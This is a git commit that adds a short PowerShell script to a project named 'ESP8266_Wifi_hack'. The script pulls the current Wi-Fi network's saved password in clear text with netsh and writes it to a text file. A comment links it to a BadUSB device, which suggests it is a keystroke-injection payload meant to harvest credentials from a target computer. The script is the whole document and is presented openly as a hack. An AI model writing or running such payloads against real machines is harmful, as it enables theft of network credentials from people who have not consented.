73845e339cb762d952530600cb1de49ddb6d8095
Pratik Luhana <luhanapratik@gmail.com>
2024-02-27 13:59:18 +0530

    Add files via upload

---
+++ ESP8266_Wifi_hack/script.ps1
@@ -0,0 +1,8 @@
+#get the name of the current network connection
+$sid = (Get-NetConnectionProfile).Name
+
+#retrieve the Wi-Fi passwords stored on the computer
+$wifiPasswords = netsh wlan show profiles name=$sid key=clear
+
+#save output into .txt file(D: drive = BadUsb) 
+Out-File -FilePath "C:\Users\luhan\OneDrive\Desktop\wifi_passwords.txt" -InputObject $wifiPasswords
